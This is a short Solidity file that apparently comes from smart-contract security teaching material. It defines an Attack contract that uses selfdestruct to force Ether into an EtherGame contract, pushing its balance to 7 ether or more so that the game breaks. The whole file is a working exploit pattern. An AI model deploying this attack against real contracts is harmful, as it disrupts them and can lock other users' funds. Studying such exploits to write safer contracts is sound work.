// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {EtherGame} from "./EtherGame.sol";

contract Attack {
    EtherGame etherGame;

    constructor(address _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function attack() public payable {
        // You can simply break the game by sending ether so that
        // the game balance >= 7 ether

        // cast address to payable
        address payable addr = payable(address(etherGame));
        selfdestruct(addr); // this will delete the Attack contract and send the contract's balance to the EtherGame Contract. This forcibly transfers Attack-Contract's Ether to EtherGame without calling any function.
    }

    receive() external payable {}
}